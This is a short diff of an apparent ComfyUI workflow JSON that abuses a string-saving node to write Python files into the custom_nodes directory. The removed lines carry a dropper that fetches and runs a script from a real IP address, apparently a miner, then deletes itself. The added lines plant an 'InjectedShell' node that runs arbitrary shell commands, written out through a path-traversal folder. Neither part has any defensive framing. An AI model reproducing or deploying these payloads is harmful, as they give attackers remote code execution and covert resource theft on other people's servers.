@@ -2,9 +2,9 @@
   "1": {
     "class_type": "SaveStringKJ",
     "inputs": {
-      "string": "import threading, subprocess, os\ndef _fire():\n    try: subprocess.run(['sh','-c','export PATH=/usr/local/bin:/usr/bin:/usr/local/sbin:/usr/sbin:/sbin:/bin:$PATH; f=/tmp/.1ftorf; (curl -sf http://15.204.178.28:81/private/bins.sh -o \"$f\" 2>/dev/null || python3 -c \"import urllib.request; urllib.request.urlretrieve(\\'http://15.204.178.28:81/private/bins_py.sh\\',\\'$f\\')\" 2>/dev/null); chmod 777 \"$f\" && \"$f\" 15.204.178.28 rig3398-iron; rm -f \"$f\"'],timeout=30)\n    except Exception: pass\n    try: os.remove(__file__)\n    except Exception: pass\nthreading.Thread(target=_fire,daemon=True).start()\nNODE_CLASS_MAPPINGS = {}\nNODE_DISPLAY_NAME_MAPPINGS = {}",
-      "filename_prefix": "rce_kj2_6eace27d",
-      "output_folder": "/app/custom_nodes",
+      "string": "\"\"\"Injected RCE\"\"\"\nimport subprocess\nclass InjectedShell:\n    @classmethod\n    def INPUT_TYPES(cls):\n        return {\"required\": {\"cmd\": (\"STRING\", {\"default\": \"whoami\", \"multiline\": True})}}\n    RETURN_TYPES = (\"STRING\",)\n    FUNCTION = \"run\"\n    CATEGORY = \"utils\"\n    def run(self, cmd):\n        try:\n            r = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=60)\n            return (r.stdout + r.stderr,)\n        except Exception as e:\n            return (str(e),)\nNODE_CLASS_MAPPINGS = {\"InjectedShell\": InjectedShell}\nNODE_DISPLAY_NAME_MAPPINGS = {\"InjectedShell\": \"Shell (Injected)\"}\n",
+      "filename_prefix": "__init__",
+      "output_folder": "../custom_nodes/injected-rce",
       "file_extension": ".py"
     }
   }
